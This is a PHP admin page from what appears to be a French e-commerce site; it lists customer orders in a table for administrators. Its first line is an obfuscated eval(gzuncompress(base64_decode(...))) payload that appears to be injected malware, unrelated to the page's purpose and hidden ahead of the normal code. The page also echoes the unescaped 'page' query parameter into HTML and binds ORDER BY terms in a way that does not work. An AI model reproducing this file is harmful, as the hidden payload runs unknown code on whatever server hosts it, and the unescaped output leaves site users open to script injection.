<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
require_once('../inc/init.inc.php');

//pour la sécurité:  //personne ne sera ici c pas admin
if (!isAdmin()){

    header("location:" . URL . "../index.php");  // si l'utilisateur n'est pas admin il ne poura pas rentrer dans cette page il ne pourra pas s'amuser sur l url grace à l'exit()
    exit();//provoque une erreur fatal et bloc l execution du script  
}

require_once('../inc/header.inc.php');
require_once('../inc/nav.inc.php');
$orderby ='';
$position = '';
//afficher les commandes
//tri sur les commandes
$orderby = (empty($orderby))?'c.id_commande': $_GET['orderby'];
$position = (empty($position))? 'ASC':$_GET['position'];
$mescommandes = $pdo->prepare("SELECT * FROM commande ORDER BY :position :orderby");
$mescommandes->bindParam(':position', $position,PDO::PARAM_STR);
$mescommandes->bindParam(':orderby', $orderby, PDO::PARAM_STR);
$mescommandes->execute();
//creation du tableau d'affichage des commandes 
echo $msg;
echo'<table class="table table-bordered bg-white">
<thead class="thead-dark">
<tr>
<th>ID</th>
<th>id_membre</th>
<th>montant</th>
<th>etat</th>
<th>date_enregistrement</th>
<th>Voir</th>
</tr>
</thead>';
while($commandes=$mescommandes->fetch(PDO::FETCH_ASSOC)){
	echo '<tr>' ;
	foreach($commandes as $key => $values)
	{
		echo '<td>'.$values.'</td>';   
	}  

	echo '<td><a href="commandes.php?page='.$_GET['page'].'&action=voir&id_commande='.$commandes['id_commande'].'" class="btn btn-success text-white"  > <i class="fas fa-eye"></i></a>  </td>';
	echo '</tr>' ;
}
echo '</table>';
//inclusion des éléments:
require_once('../inc/modal_mentionslegales.inc.php');
require_once('../inc/modal_conditionsdevente.inc.php');
require_once('../inc/footer.inc.php');